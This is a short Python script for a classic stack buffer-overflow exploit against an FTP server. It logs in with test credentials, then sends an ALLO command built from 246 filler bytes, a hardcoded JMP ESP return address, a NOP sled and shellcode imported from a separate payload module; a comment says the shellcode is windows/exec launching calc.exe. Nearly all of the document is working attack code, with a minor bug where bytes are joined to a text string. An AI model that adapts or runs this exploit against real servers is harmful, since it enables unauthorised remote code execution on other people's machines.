#!/usr/bin/python
import socket,sys,time,os
from payload import buf
import socket
from struct import pack
import struct
import os
def shell_attack(target_machine, target_port):

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


	


	ip   = target_machine
	port = target_port

	junk1= b"\x41" * 246
	ret  = b"\xED\x1E\x94\x7C" #7C941EED JMP ESP
	nop  = b"\x90"* 200
	# windows/exec          CMD=calc.exe
	

	buff   = junk1 + ret + nop + buf

	try:
		print("[-] Connecting to " + ip + " on port " + port + "\n")
		s.connect((ip,int(port)))
		data = s.recv(1024)
		print("[-] Sending exploit...")
		s.send(b"USER test\r\n")
		s.recv(1024)
		s.send(b"PASS test\r\n")
		s.recv(1024)
		s.send(b"ALLO "+buff+"\r\n")
		s.close()
		print("[-] Exploit successfully sent...")
	except:
		print("[-] Connection error...")
		print("[-] Check if victim is up.")